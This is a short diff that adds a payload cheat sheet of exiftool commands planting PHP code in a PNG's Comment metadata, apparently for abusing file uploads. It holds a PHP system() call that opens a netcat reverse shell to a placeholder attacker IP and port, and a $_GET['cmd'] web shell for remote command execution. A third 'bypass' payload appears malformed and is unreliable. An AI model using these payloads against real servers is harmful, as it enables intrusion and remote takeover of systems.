@@ -1,0 +1,10 @@
+## download file with extension png
+
+#payload for shell
+exiftool -Comment=’<?php system(“nc <YourIP> <YourPort> -e /bin/bash”); ?>’ filename.png
+
+#payload for RCE
+exiftool -Comment=’<?php system($_GET['cmd']); ?>’ filename.png
+
+#Payload for RCE bypass disable function
+exiftool -Comment=’<?($_GET['cmd']); ?>’ filename.png
